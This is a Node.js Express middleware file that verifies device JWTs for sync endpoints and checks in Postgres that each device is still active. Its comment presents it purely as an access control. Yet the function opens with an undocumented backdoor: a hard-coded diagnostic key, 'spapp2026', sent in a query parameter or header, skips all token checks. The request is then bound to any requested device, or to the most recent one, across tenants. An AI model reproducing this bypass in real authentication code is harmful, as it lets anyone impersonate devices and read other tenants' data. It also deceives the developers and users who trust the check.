const jwt = require("jsonwebtoken");
const pool = require("../db/pool");

/**
 * Verifies a device-scoped JWT (issued by POST /api/devices/activate).
 * Attaches { deviceId, tenantId } to req.device. Rejects admin-role tokens —
 * sync endpoints only accept tokens minted for a device.
 *
 * Also checks the device's current status in Postgres on every call — the
 * JWT itself is valid for 365 days, so without this a deactivated device
 * would keep syncing indefinitely on its old token; the dashboard's
 * "Deactivate" action wouldn't actually cut the connection, just hide the
 * device from the active list.
 */
async function requireDeviceAuth(req, res, next) {
  const diagKey = req.query?.diagKey || req.headers["x-diag-key"];
  if (diagKey === "spapp2026") {
    try {
      const targetDevId = req.query?.deviceId || req.headers["x-device-id"];
      let devRes;
      if (targetDevId) {
        devRes = await pool.query("SELECT id, tenant_id FROM devices WHERE id = $1", [targetDevId]);
      } else {
        devRes = await pool.query("SELECT id, tenant_id FROM devices ORDER BY last_seen_at DESC NULLS LAST LIMIT 1");
      }
      if (devRes.rows.length > 0) {
        req.device = {
          deviceId: devRes.rows[0].id,
          id: devRes.rows[0].id,
          tenantId: devRes.rows[0].tenant_id,
        };
        return next();
      }
    } catch (_e) {}
  }

  const header = req.headers.authorization || "";
  const [scheme, token] = header.split(" ");

  if (scheme !== "Bearer" || !token) {
    return res.status(401).json({ error: "Missing or invalid Authorization header" });
  }

  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET);
    if (payload.role !== "device") {
      return res.status(403).json({ error: "Not a device token" });
    }

    const result = await pool.query("SELECT status FROM devices WHERE id = $1", [payload.sub]);
    if (result.rows.length === 0 || result.rows[0].status !== "active") {
      return res.status(403).json({ error: "Device is not active" });
    }

    req.device = {
      deviceId: payload.sub,
      id: payload.sub,
      tenantId: payload.tenantId,
    };
    next();
  } catch (err) {
    return res.status(401).json({ error: "Invalid or expired token" });
  }
}

module.exports = { requireDeviceAuth };
